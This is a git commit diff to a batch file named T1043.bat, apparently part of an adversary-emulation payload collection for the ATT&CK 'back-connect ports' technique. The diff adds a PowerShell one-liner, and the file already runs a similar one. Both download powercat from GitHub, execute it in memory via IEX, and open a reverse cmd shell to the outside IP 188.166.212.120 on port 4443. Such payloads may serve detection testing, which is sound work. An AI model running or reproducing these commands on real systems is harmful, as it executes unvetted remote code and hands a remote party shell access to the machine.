755eb104637978bc39356fbe10424cdaf8f2876b
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 13:01:58 +0530

    Update T1043.bat

--- Payloads/T1043/T1043.bat
+++ Payloads/T1043/T1043.bat
@@ -8,6 +8,7 @@ ECHO Technique: Malware Back connect Ports (T1043)
 ECHO.
 ECHO [+] Powercat
 ECHO -------------------------------------------------------------------
+echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/powercat/master/powercat.ps1'); $m = powercat -c 188.166.212.120 -p 4443 -e cmd -v; $m | powershell.exe -
 cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/powercat/master/powercat.ps1'); $m = powercat -c 188.166.212.120 -p 4443 -e cmd -v; $m
 ECHO.
 
